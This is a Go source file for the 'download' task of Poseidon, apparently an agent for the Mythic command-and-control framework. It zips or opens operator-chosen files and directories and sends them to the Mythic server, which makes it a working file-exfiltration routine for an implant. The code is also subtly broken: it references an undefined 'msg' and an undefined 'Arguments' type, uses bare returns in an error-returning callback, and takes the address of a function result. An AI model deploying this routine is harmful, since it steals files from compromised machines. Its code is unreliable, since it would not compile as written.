package download

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

// zipFilesAndDirectories compresses files/directories into a single zip in memory
func zipFilesAndDirectories(paths []string) (*bytes.Buffer, error) {
	var buffer bytes.Buffer
	zipWriter := zip.NewWriter(&buffer)

	for _, path := range paths {
		err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
			if err != nil {
				msg.SetError("error accessing path %s: %w", filePath, err)
				return
			}

			relativePath, err := filepath.Rel(filepath.Dir(path), filePath)
			if err != nil {
				msg.SetError("error calculating relative path for %s: %w", filePath, err)
				return
			}

			if info.IsDir() {
				_, err := zipWriter.Create(relativePath + "/")
				if err != nil {
					msg.SetError("error creating directory in zip: %w", err)
				return
				}
				return nil
			}

			fileWriter, err := zipWriter.Create(relativePath)
			if err != nil {
				msg.SetError("error creating file in zip: %w", err)
				return
			}

			file, err := os.Open(filePath)
			if err != nil {
				msg.SetError("error opening file %s: %w", filePath, err)
				return
			}
			defer file.Close()

			_, err = io.Copy(fileWriter, file)
			if err != nil {
				msg.SetError("error writing file to zip: %w", err)
				return
			}

			return nil
		})

		if err != nil {
			return nil, err
		}
	}

	err := zipWriter.Close()
	if err != nil {
		return nil, fmt.Errorf("error closing zip writer: %w", err)
	}

	return &buffer, nil
}

// Define a struct to parse parameters
type zipDownloadArgs struct {
	Paths    []string `json:"paths"`    // List of file or directory paths
	Compress bool     `json:"compress"` // Option to compress the files/directories
}

// Run - Function that executes the download task
func Run(task structs.Task) {
	msg := task.NewResponse()
	args := &Arguments{}
	err := json.Unmarshal([]byte(task.Params), args)
	if err != nil {
		msg.SetError(fmt.Sprintf("Failed to parse parameters: %s", err.Error()))
		task.Job.SendResponses <- msg
		return
	}

	// Check if compression is enabled
	if args.Compress {
		// Compress the specified files and directories into a zip archive in memory
		zipBuffer, err := zipFilesAndDirectories(args.Paths)
		if err != nil {
			msg.SetError(fmt.Sprintf("Failed to create zip archive: %s", err.Error()))
			task.Job.SendResponses <- msg
			return
		}

		// Prepare the download message with the zip data
		downloadMsg := structs.SendFileToMythicStruct{}
		downloadMsg.Task = &task
		downloadMsg.IsScreenshot = false
		downloadMsg.SendUserStatusUpdates = true
		downloadMsg.Data = &zipBuffer.Bytes()
		downloadMsg.FileName = "download.zip"
		downloadMsg.FinishedTransfer = make(chan int, 2)

		// Send the file to Mythic
		task.Job.SendFileToMythic <- downloadMsg

		handleTransferCompletion(task, downloadMsg)


	} else {
		// Handle files directly without compression
		for _, path := range args.Paths {
			fullPath, err := filepath.Abs(path)
			if err != nil {
				msg.SetError(fmt.Sprintf("Error resolving path: %s", err.Error()))
				task.Job.SendResponses <- msg
				return
			}

			file, err := os.Open(fullPath)
			if err != nil {
				msg.SetError(fmt.Sprintf("Error opening file: %s", err.Error()))
				task.Job.SendResponses <- msg
				return
			}

			fi, err := file.Stat()
			if err != nil {
				msg.SetError(fmt.Sprintf("Error getting file size: %s", err.Error()))
				task.Job.SendResponses <- msg
				return
			}

			// Prepare the download message for the file
			downloadMsg := structs.SendFileToMythicStruct{}
			downloadMsg.Task = &task
			downloadMsg.IsScreenshot = false
			downloadMsg.SendUserStatusUpdates = true
			downloadMsg.File = file
			downloadMsg.FileName = fi.Name()
			downloadMsg.FullPath = fullPath
			downloadMsg.FinishedTransfer = make(chan int, 2)

			// Send the file to Mythic
			task.Job.SendFileToMythic <- downloadMsg

			handleTransferCompletion(task, downloadMsg)
		}
	}
}

// handleTransferCompletion handles the completion of the file transfer
func handleTransferCompletion(task structs.Task, downloadMsg structs.SendFileToMythicStruct) {
	for {
		select {
		case <-downloadMsg.FinishedTransfer:
			msg := task.NewResponse()
			msg.Completed = true
			msg.UserOutput = "Finished Downloading"
			task.Job.SendResponses <- msg
			return
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				msg := task.NewResponse()
				msg.SetError("Tasked to stop early")
				task.Job.SendResponses <- msg
				return
			}
		}
	}
}
